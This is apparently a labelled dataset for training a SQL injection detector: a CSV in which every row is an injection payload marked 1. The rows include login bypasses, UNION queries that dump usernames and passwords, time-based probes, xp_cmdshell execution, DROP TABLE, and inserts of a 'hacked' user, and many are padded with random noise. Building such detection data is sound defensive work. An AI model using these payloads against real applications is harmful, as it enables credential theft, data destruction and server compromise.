Sentence,Label
"admin1"" OR ""1"" = ""1--/*737#--#",1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1 AND 1=1,1
admin1' OR '1' = '1--/*/*--,1
"1"" UNION SELECT NULL,NULL,NULL--149 OR 1=1 OR 1=1494#/*",1
"admin' UNION SELECT NULL,NULL--897514154657",1
'+OR+'1'='1--549 OR 1=1864,1
' OR '2'='213/*#942175,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*555209,1
"' union select null,null,null--# AND 1=1--491 OR 1=1510628",1
"test1"" OR 1 = 1/*971",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236 OR 1=1/*",1
useradmin' OR '1'='1--273,1
"admin"") OR 1=1----/*/*366",1
admin') OR 1=1--#858,1
"ADMIN""/*172531##",1
admin' UNION ALL SELECT NULL----547,1
' UNION SELECT NULL--/*622/*42723290,1
""")/**/OR/**/1=1-- AND 1=1",1
"1'%09UNION%09SELECT%09NULL,table_name%09FROM%09information_schema.tables--358",1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables----418 OR 1=1915 AND 1=1",1
0x27; DROP TABLE users--15479,1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655428/*665/*",1
admin' UNION ALL SELECT NULL--892 OR 1=1957900,1
"""%20UNION%20ALL%20SELECT%20NULL--908#565393383438",1
"99'; INSERT INTO users VALUES('hacked','pass')--37281667310",1
11' OR 1 = 1/*595,1
admin' UNION ALL SELECT NULL----# AND 1=1691329,1
test' UNION ALL SELECT NULL--954683264,1
admin'/**/OR/**/1=1-- OR 1=1823511,1
"admin"") OR 1=1----/*602",1
"test' UNION SELECT NULL,NULL--/*978#-- OR 1=1",1
"user"") OR (""1""=""1 AND 1=1 AND 1=1/*",1
10x27 AND pg_sleep(5)--#426,1
'%09or%091=1# AND 1=11 AND 1=1,1
"test' UNION SELECT NULL,NULL--/* AND 1=1-- AND 1=1",1
"admin1"" OR ""1"" = ""1--/*737#696",1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1728681/*,1
"admin' UNION SELECT 1,2,3-- AND 1=1",1
""" OR ""2""=""213 AND 1=1/*267566",1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353#--",1
' UNION ALL SELECT NULL--# AND 1=1 OR 1=1,1
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679--",1
"' union select null,null,null--# AND 1=1--491#606",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1/*--696,1
1' OR '1'='1 OR 1=1 AND 1=1#,1
"""%20or%201=1/*835 OR 1=1 OR 1=1743724",1
"test"" OR 1=1##933 OR 1=1",1
""" AND extractvalue(1,concat(0x7e,version()))--161/*#150",1
"admin"" UNION SELECT 1,2,3----811-- OR 1=1#",1
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1 OR 1=1,1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#87117534,1
' OR '1'='1' --/*814,1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))-- OR 1=1 OR 1=1--#",1
""" UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927 AND 1=1851 AND 1=1",1
""" AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#21",1
1%27%3B%20DROP%20TABLE%20users-- OR 1=1,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1666270",1
'; UPDATE USERS SET PASSWORD='HACKED'--69164 OR 1=1475,1
1%27%20OR%20%271%27%20%3D%20%271/*191 OR 1=1,1
'%20or%201=1#/*#137,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#856",1
admin' UNION ALL SELECT NULL-- AND 1=1623462,1
%27%20AND%201%3DCAST%28%28SELECT%20%40%40version%29%20AS%20int%29--,1
'/**/OR/**/1=1-- OR 1=1 OR 1=1# AND 1=1780,1
';%09EXEC%09xp_cmdshell('dir')--,1
' OR 1=1#----#312484,1
'%09UNION%09ALL%09SELECT%09NULL--/* OR 1=1674,1
"admin"" UNION SELECT NULL,NULL--181885760",1
' OR '2'='2 AND 1=1 AND 1=1--/*,1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517457#359 OR 1=1",1
';+EXEC+xp_cmdshell('dir')--## AND 1=1,1
""" OR 99=99##77#",1
"1"" OR ""1"" = ""1 AND 1=1742395 OR 1=1",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#458/*--,1
admin' UNION SELECT NULL-- AND 1=1#645/*735909--276,1
"admin""/*451",1
%2527%2520OR%25201%253D1/%252A/*#,1
"1'; INSERT INTO users VALUES('hacked','pass')--739# OR 1=1",1
"user' UNION SELECT 1,2,3-- AND 1=1--",1
"test"" OR 1=1##933 AND 1=1",1
"admin1"" OR ""1"" = ""1--/*603#937149",1
"test"" UNION SELECT NULL,NULL--/* AND 1=1740",1
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1346810,1
'%20or%201=1#/* OR 1=1 OR 1=1/*,1
"user' UNION SELECT NULL,NULL,NULL-- AND 1=1",1
"admin' UNION SELECT 1,2,3----107",1
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1366,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--# OR 1=1",1
"test' UNION SELECT 1,2,3-- OR 1=1574 OR 1=1",1
"admin1"" OR ""1"" = ""1# AND 1=1#785489920/*",1
"user"" UNION SELECT 1,2,3-- AND 1=1749347",1
%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--184 AND 1=1324,1
2' OR 2 = 2--#/*951 OR 1=1,1
')/**/OR/**/1=1-- OR 1=1,1
admin'/**/OR/**/1=1-- OR 1=1402222,1
1' OR '1'='1' --#57 OR 1=1#--,1
10x27; WAITFOR DELAY 0x2700:00:050x27----928785,1
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/*# AND 1=1",1
admin' UNION ALL SELECT NULL--24127474 OR 1=1,1
user' UNION SELECT NULL-- AND 1=14866,1
testadmin' OR '1'='1 AND 1=1 OR 1=1 OR 1=1 AND 1=1593,1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408298937",1
"admin"" OR 1=1/*#514",1
"user"" UNION SELECT NULL--/*58370 AND 1=1 AND 1=1975/* OR 1=1",1
1'%20OR%20'1'%20=%20'1918/* AND 1=1,1
'%20or%201=1--969 OR 1=1/*215184,1
ADMIN'/*172620/*27,1
')+OR+('1'='1346583,1
'%20or%201=1# AND 1=1368558,1
' AND 1=CAST((SELECT @@version) AS int)--/*696,1
'/**/or/**/1=1/* AND 1=1 AND 1=1 OR 1=1 OR 1=1,1
' OR '1'='1' --/* AND 1=1 OR 1=1,1
admin' OR 1=1-- AND 1=165161--,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1--#",1
"test"" OR 1=1##933102#/*986 OR 1=1570 AND 1=1",1
user' OR 'a'='a--920 OR 1=1,1
"test1"" OR ""1"" = ""1/*# AND 1=1--631274-- AND 1=1",1
ADMIN'/*172620279715,1
"test"" UNION SELECT username,password FROM users-- AND 1=1364586",1
"1' UNION SELECT NULL,NULL------611",1
"1'; INSERT INTO users VALUES('hacked','pass')--739#450",1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=1 AND 1=1,1
"admin' UNION SELECT NULL,NULL--897861/*",1
"""%20or%201=1# AND 1=1679",1
user' OR '1'='1#-- OR 1=1962,1
' AND 2=CAST((SELECT @@version) AS int)--# AND 1=1,1
%2527%253B%2520SELECT%2520SLEEP%25285%2529-- AND 1=1741,1
1' OR '1'='1' --#57 OR 1=1704427,1
"test"" UNION SELECT 1,2,3-- AND 1=1512 AND 1=1#793#307",1
test1' OR '1' = '1--,1
"admin"" UNION SELECT NULL,NULL--181885 AND 1=1207",1
"'%20UNION%20SELECT%20NULL,NULL,NULL----#712 AND 1=1305",1
""" OR ""1""=""1#358706--767",1
"user"") OR (""1""=""128 AND 1=1 OR 1=1470",1
"admin""/**/OR/**/1=1-- OR 1=1780/*",1
admin' OR 1=1# AND 1=1,1
""";%20EXEC%20xp_cmdshell(""dir"")--# AND 1=1202/* OR 1=1",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311#--",1
'/**/OR/**/'1'='1'/**/--/*75#591210,1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1-- OR 1=1915",1
%2527%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL----,1
user' UNION SELECT NULL-- AND 1=1 OR 1=1,1
admin'%20OR%20'1'='1 AND 1=1987656/*,1
"1';+INSERT+INTO+users+VALUES('hacked','pass')--517745",1
""" UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927 AND 1=1851",1
2' OR '2' = '2163254#784--,1
'%20UNION%20ALL%20SELECT%20NULL--27 OR 1=1,1
"admin"" OR 1=1/*#104#",1
2'--549,1
"1""%20AND%20pg_sleep(5)--533872287 OR 1=1124/*",1
user' UNION ALL SELECT NULL--/*/*--#,1
%2527%2520OR%25201%253D1/%252A--4308,1
admin1' OR 1 = 1 AND 1=1-- AND 1=1747,1
'%09OR%091=1--#727,1
"user' UNION SELECT username,password FROM users------245#583",1
"user"" UNION SELECT NULL,NULL--# OR 1=1/*655428/*",1
"1"" UNION SELECT NULL----159334593107 AND 1=1212",1
admin0x27/*467468#,1
admin' OR '1'='1946#540929,1
"' UNION SELECT 1,2,3--/*#58",1
%27%3B%20UPDATE%20users%20SET%20password%3D%27hacked%27--706,1
"admin' UNION SELECT NULL,NULL,NULL--/*#/*176",1
' AND 2=CAST((SELECT @@version) AS int)--#373 OR 1=1380386,1
')/**/OR/**/1=1-- AND 1=1/*,1
"1'; INSERT INTO users VALUES('hacked','pass')--739--124",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594--769",1
'/**/OR/**/1=1/*,1
1' OR '1'='1' --#57/*14632 AND 1=1424#,1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- AND 1=1 AND 1=1996",1
"adminadmin"" OR ""1""=""1/*--/*217 OR 1=1414",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1-- OR 1=1#118",1
"ADMIN""/*172247/*799 OR 1=1",1
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1978/*",1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408127447",1
"user"" UNION SELECT NULL--/*58370329/*62",1
"""/**/or/**/1=1/*135540--",1
2' AND SLEEP(5)--761 OR 1=1,1
"useradmin"" OR 1=1--#572/*-- AND 1=1",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#/*",1
""" or 2=2/* AND 1=1#812",1
"1"" UNION SELECT NULL,NULL,NULL--14992947",1
admin' OR '1'='1' /*827,1
""")+OR+(""1""=""1 AND 1=1875513",1
"testadmin"" OR 1=1-- AND 1=1 AND 1=1497457",1
"1'%09UNION%09SELECT%09NULL,table_name%09FROM%09information_schema.tables--567",1
user') OR ('1'='1--167387715/*,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##794 AND 1=134603",1
admin') OR ('1'='1#/*,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815# OR 1=1",1
"admin"" UNION SELECT NULL-- AND 1=1 AND 1=1",1
user') OR 1=1-- AND 1=1325 AND 1=167#643 AND 1=1,1
""" union select null,null,null--860 AND 1=1 AND 1=1",1
"'%09UNION%09SELECT%09NULL,NULL--21933",1
"useradmin"" OR 1=1--#572 OR 1=1--441",1
""" AND 1=CAST((SELECT @@version) AS int)--/*#",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#895,1
test' UNION SELECT NULL----#261--50,1
ADMIN'/* AND 1=1911 AND 1=110515794108,1
1'%20AND%20pg_sleep(5)--533872 AND 1=1#,1
1' UNION SELECT NULL----395225410,1
"admin1"" OR ""1"" = ""1# AND 1=1# OR 1=1",1
'+OR+1=1#/*# AND 1=1/*#/*/*968,1
user' OR '1'='1#315----,1
' OR '2'='2 AND 1=1 AND 1=1--173--913464,1
') OR ('1'='1/* OR 1=1293408576,1
"test"" OR ""1""=""1-- OR 1=1733922",1
"1""----101",1
"admin1"" OR ""1"" = ""1--279#",1
"""/**/or/**/1=1/*135721",1
admin' OR 1=1/*##487 OR 1=1775,1
""" AND 1=CAST((SELECT @@version) AS int)--/*423",1
2' AND SLEEP(5)----232663,1
' OR '1'='1#474225795,1
') OR ('1'='1/* OR 1=1/* OR 1=1491619,1
""" OR ""1""=""1 AND 1=1676",1
' OR '99'='99' /*,1
1'%20AND%20pg_sleep(5)--533/*,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*#--253",1
'+OR+'1'='1--549 OR 1=1 AND 1=1,1
user1' OR 1 = 1/*/*,1
"useradmin"" OR ""1""=""1-- OR 1=1125737948872",1
admin'%20OR%20'1'='1 AND 1=1987 OR 1=1999,1
admin'/**/OR/**/1=1-- OR 1=1 OR 1=1756710825/*,1
"""+UNION+SELECT+NULL--608861#",1
"ADMIN""/* AND 1=1310",1
"user' UNION SELECT 1,2,3-- AND 1=1809 OR 1=1--",1
"user"") OR 1=1-- AND 1=1325 AND 1=167# AND 1=1528",1
' OR '1'='1--#,1
';%20EXEC%20xp_cmdshell('dir')--# AND 1=1202 OR 1=1,1
'/**/or/**/1=1/*135/*,1
test' OR 1=1## AND 1=1/*#,1
' or 1=1----68552687,1
"' UNION SELECT username,password FROM users-- OR 1=1180",1
"user"" OR ""1""=""1#-- OR 1=1338",1
'%20or%201=1# AND 1=1878,1
"admin' UNION SELECT username,password FROM users-- AND 1=1/*/*",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1/*432,1
""" AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--",1
"user"" UNION SELECT NULL--/*58370#",1
' AND 2=CAST((SELECT @@version) AS int)--#,1
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1576",1
user') OR ('1'='1-- OR 1=1,1
admin' UNION SELECT NULL-- AND 1=1#645270926,1
"' union select null,null,null--# AND 1=1----",1
""" AND extractvalue(1,concat(0x7e,version()))--161/*788 AND 1=1",1
' OR 99=99#12 AND 1=1,1
"admin' UNION SELECT NULL,NULL--897514--",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--695",1
"""%20or%201=1#/* OR 1=1 OR 1=1378",1
"0x27 UNION SELECT NULL,NULL,NULL-- OR 1=1 OR 1=1# AND 1=1",1
"""/**/OR/**/""1""=""1""/**/--413--",1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--378",1
"' UNION SELECT NULL,NULL,NULL--24179852",1
"user' UNION SELECT username,password FROM users------553",1
"1"" UNION SELECT NULL----159334593107 AND 1=1/*--",1
' OR '1'='1#474225612,1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1 AND 1=1 AND 1=1--939",1
useradmin' OR '1'='1#,1
"' union select null,null,null--##142",1
"99'; INSERT INTO users VALUES('hacked','pass')--372 AND 1=1",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594--/*",1
' OR '2'='213973 AND 1=1--53-- OR 1=1,1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406404 OR 1=1169,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*##48--756,1
"'%20UNION%20SELECT%20NULL,NULL,NULL----#712 AND 1=1900375",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812371/*#",1
user' OR '1'='1#315-- AND 1=1/*619455,1
"admin"") OR (""1""=""1# OR 1=16014866--",1
""" or 2=2/* AND 1=1/* AND 1=1 AND 1=1",1
"test' UNION SELECT 1,2,3-- AND 1=1512355/*",1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=119827",1
' UNION SELECT NULL--/*622/*427/*25640440326,1
test1' OR '1' = '1/*#63257 AND 1=1,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")----330/*",1
"user"") OR (""1""=""1--167387#850",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1 OR 1=1 OR 1=1423338,1
"1' AND BENCHMARK(10000000,MD10('A'))-- AND 1=1 AND 1=1",1
"1""/**/AND/**/SLEEP(5)--646",1
'/**/OR/**/'1'='1'/**/-- OR 1=1575 AND 1=1,1
"""%09or%091=1# AND 1=1 OR 1=1691708",1
') OR 1=1--,1
') OR ('1'='1/*--384524,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497 AND 1=1",1
';%20EXEC%20xp_cmdshell('dir')--# AND 1=1202/* OR 1=1440,1
') OR ('1'='1,1
"""%20UNION%20ALL%20SELECT%20NULL--108 AND 1=181",1
user1' OR '1' = '1659--443,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29-- AND 1=1524534,1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=1/*",1
1' UNION ALL SELECT NULL----,1
admin' OR 'a'='a/* OR 1=1,1
""" union select null,null,null--860 AND 1=1810",1
admin%2527--21576677,1
'%20or%201=1/*835257/* OR 1=1 AND 1=184,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--198650601240",1
' OR 1=1#----#18439,1
"user"" UNION SELECT NULL,NULL--/* OR 1=1428 OR 1=1",1
admin') OR 1=1--#710,1
""" OR ""2""=""2 AND 1=1 AND 1=1--173445",1
"1"" UNION SELECT NULL,NULL--#876156",1
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1346 AND 1=1488,1
admin' UNION ALL SELECT NULL--,1
admin'/*451493,1
admin') OR 1=1----/*,1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*476860 OR 1=1,1
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*877",1
"admin"" UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*/* OR 1=1",1
admin' OR 1=1#664 AND 1=1,1
"admin"" UNION ALL SELECT NULL--",1
"1"" UNION SELECT NULL----159667----16",1
' or 1=1--73392,1
useradmin' OR 1=1--#/*60666832,1
"""%20or%201=1/*696106",1
admin') OR 1=1----774# OR 1=1,1
test' UNION ALL SELECT NULL--954683 AND 1=1,1
""" UNION SELECT NULL,NULL-- AND 1=1",1
"admin"" UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=1371",1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1#75681",1
admin0x27/* OR 1=1 AND 1=1298912 OR 1=1,1
"' UNION SELECT username,password FROM users-- OR 1=1359",1
test' UNION SELECT NULL----/*--19921,1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247810561#958",1
"""/**/or/**/1=1/*135540 OR 1=1--",1
admin0x27/*467468/*,1
1'%20OR%201%20=%201/*,1
""")+OR+(""1""=""1 AND 1=1 OR 1=1#",1
"ADMIN""/*172871638201",1
"1"" OR ""a""=""a AND 1=1-- AND 1=1",1
1'%09AND%09pg_sleep(5)--860513 OR 1=1723845,1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=198256541312#",1
""" UNION ALL SELECT NULL--#",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#423/*936",1
' OR 1=1#-- OR 1=1511,1
1'----101--/*799--,1
"test"" UNION SELECT NULL,NULL--/* AND 1=1753",1
"test"" OR ""1""=""1"" /*#/*654879",1
"'%20AND%20updatexml(1,concat(0x7e,version()),1)--#",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1665770",1
"ADMIN""/*1721 OR 1=1",1
"1"" OR ""1""=""1"" /* AND 1=1",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958688340#",1
' OR '2'='2 AND 1=1 AND 1=1--173--913123,1
admin' UNION ALL SELECT NULL-- AND 1=1113,1
"admin' UNION SELECT NULL,NULL--897861916",1
"testadmin"" OR ""1""=""1 AND 1=1613186#218616306227",1
'/**/OR/**/'a'='a922980622971/*381190,1
"1"" OR ""a""=""a AND 1=1--376--546398/*",1
admin0x27/* OR 1=187746,1
"user"") OR 1=1-- AND 1=1/* OR 1=187",1
user') OR ('1'='1--#335,1
admin' OR 1=1/*--863 AND 1=1 AND 1=1673 OR 1=1,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/* OR 1=1#595,1
"admin' UNION SELECT 1,2,3----811672",1
"' UNION SELECT username,password FROM users--/* OR 1=1369",1
user' OR 'a'='a/*,1
useradmin' OR 1=1--#/*606171 OR 1=1,1
test' OR 1=1##/* OR 1=1-- OR 1=1547,1
'%20or%201=1/*83525738383835,1
user' UNION SELECT NULL-- AND 1=14#,1
useradmin' OR 1=1------982,1
"user"") OR (""1""=""1 AND 1=1379",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1370680347",1
"1"" UNION SELECT NULL----159334593107 AND 1=1/*/*",1
"admin"" OR ""99""=""99 OR 1=1303",1
"""%20or%201=1/*835 OR 1=1 OR 1=1344--",1
"10x27; INSERT INTO users VALUES(0x27hacked0x27,0x27pass0x27)--#960",1
"testadmin"" OR ""1""=""1#/*",1
'%20or%201=1--969 OR 1=1/*215 OR 1=1717,1
'/**/or/**/1=1/*135540 OR 1=1349,1
'+OR+'1'='1-- AND 1=1 AND 1=1#,1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306889 OR 1=1163",1
admin' OR 'a'='a/*/*,1
admin' UNION SELECT NULL-- AND 1=1#645270629#497,1
"admin""%20OR%20""1""=""1 AND 1=1987",1
' UNION SELECT NULL--/*622/*427/*25640440 OR 1=1,1
"99"" OR 99 = 99 OR 1=1#/*5450",1
admin' OR 1=1--# OR 1=1 AND 1=1#,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1223",1
"1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=142 AND 1=1",1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739####575",1
' AND 2=CAST((SELECT @@version) AS int)--# AND 1=1614,1
ADMIN'/*172620/*55,1
"admin"" OR ""1""=""1"" /*/*",1
useradmin' OR 1=1--#/*60666532,1
' OR 1=1#----# AND 1=1--# AND 1=1519 AND 1=1,1
"ADMIN""/*172247 AND 1=1140",1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878##560",1
"ADMIN""/*172247/*799282",1
1'----10178,1
test') OR ('1'='1-- OR 1=1,1
"1""+OR+1+=+1189",1
admin' UNION ALL SELECT NULL--892 OR 1=1957#,1
"1"" UNION SELECT NULL,NULL------611--306493# OR 1=1147",1
"1"" OR ""1""=""1"" -- AND 1=1",1
%27%20or%201%3D1%23#,1
1' OR 1=1/*# OR 1=1--,1
"test' UNION SELECT NULL,NULL--/* AND 1=1--27",1
' OR 1=1#-- OR 1=1#81043732,1
ADMIN'/*172620849196533243386625,1
' or 2=2--176 AND 1=1,1
' OR '2'='2 OR 1=1468--,1
"admin""%20OR%20""1""=""1 AND 1=1987656414589#",1
'/**/OR/**/1=1-- OR 1=1 OR 1=1165 AND 1=1,1
""")+OR+(""1""=""1-- AND 1=1729414",1
"1"" OR ""1"" = ""1-- OR 1=1#334559",1
admin') OR 1=1----774,1
""" or 2=2/* AND 1=1# AND 1=1136",1
1'%09AND%09pg_sleep(5)--860 OR 1=1258190--,1
"user"") OR (""1""=""1 AND 1=1626 AND 1=115",1
user') OR 1=1-- AND 1=1882350307925/*/*,1
'%09or%091=1# AND 1=1 OR 1=1#,1
"admin1"" OR ""1"" = ""1# AND 1=1#785489 OR 1=1",1
' or 2=2/* AND 1=1/*888,1
"' UNION SELECT NULL,NULL,NULL--/*/* OR 1=1187",1
user' OR 1=1/*/* AND 1=1774,1
' or 2=2/* AND 1=1/*287,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1#",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1 OR 1=1 OR 1=1518,1
') OR ('1'='1/*--384871,1
2' AND SLEEP(5)--#396,1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*/*388,1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- OR 1=1/*",1
"1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1 OR 1=1#361",1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*321 OR 1=1103,1
"' UNION SELECT 1,2,3--/*#564",1
""" OR ""1""=""1 AND 1=1 OR 1=144#",1
admin' OR 1=1/*###,1
"user"" UNION SELECT 1,2,3-- AND 1=1749363 AND 1=1",1
test' OR '1'='1' /*#666755,1
admin1' OR '1' = '1--/*/*814 AND 1=1,1
' OR '1'='1' --/* AND 1=129,1
'%20or%201=1/*835257383135#,1
"""%20or%201=1/*835 OR 1=1 OR 1=1743 OR 1=1",1
'/**/OR/**/'1'='1'/**/-- OR 1=1575/*,1
' UNION SELECT NULL--/*622/*427/*25640770415,1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168/*#",1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1 OR 1=1/*965758",1
admin' OR '1'='1 AND 1=1998 OR 1=1,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1302602963",1
admin'%20OR%20'1'='1 AND 1=1 OR 1=1732599,1
"test' UNION SELECT username,password FROM users--/*836623",1
admin'%20OR%20'1'='1 AND 1=1987 AND 1=1--,1
"""%20or%201=1/*835 OR 1=1 OR 1=1344 OR 1=1",1
"user"") OR 1=1-- AND 1=1/*450",1
' OR '2'='213 AND 1=1/*668--,1
'%09or%091=1#,1
1%27%20OR%20%271%27%20%3D%20%271/*903,1
user' OR 1=1/*/* AND 1=1--606,1
"admin1"" OR ""1"" = ""1--/*737#267",1
'%09or%091=1--#,1
test' OR 1=1##/* OR 1=1935,1
10x27; WAITFOR DELAY 0x2700:00:050x27----562,1
admin' OR '1'='1 AND 1=1998#,1
useradmin' OR 1=1----335 AND 1=1,1
2' AND SLEEP(5)----40,1
user' OR 1=1# AND 1=1 AND 1=1 OR 1=1,1
2'-- AND 1=1,1
"1""; WAITFOR DELAY ""00:00:010""--866--",1
"ADMIN""/*172531653",1
1'%20OR%201%20=%201575409255,1
user' OR 1=1--/* OR 1=178599 OR 1=19,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739 AND 1=1567/*248",1
"1"" OR ""1"" = ""1--365188 AND 1=1",1
"""%20UNION%20ALL%20SELECT%20NULL-- AND 1=1281",1
1' UNION SELECT NULL----159946,1
"test"" UNION SELECT NULL,NULL--/* AND 1=1586/*",1
"1"" UNION SELECT NULL----395/* AND 1=1228--",1
"user' UNION SELECT username,password FROM users------245#241",1
"admin"" UNION SELECT NULL,NULL,NULL--/*# AND 1=1708",1
"0x27 UNION SELECT username,password FROM users--593/*",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=197674",1
"'%09UNION%09SELECT%09NULL,NULL--21558",1
"user' UNION SELECT NULL,NULL--# OR 1=1#248",1
1' OR '1'='1/* AND 1=1 OR 1=1/*/*--,1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1 AND 1=1",1
"1"" UNION SELECT NULL,NULL,NULL--14992680",1
"admin"" OR 1=1-- OR 1=1#781",1
"""%09or%091=1# AND 1=1 OR 1=1691449626985767",1
admin'%20OR%20'1'='1 AND 1=1987656414589450312,1
"admin"") OR 1=1----/*/*--",1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773618805",1
admin' OR 2=2--925348383,1
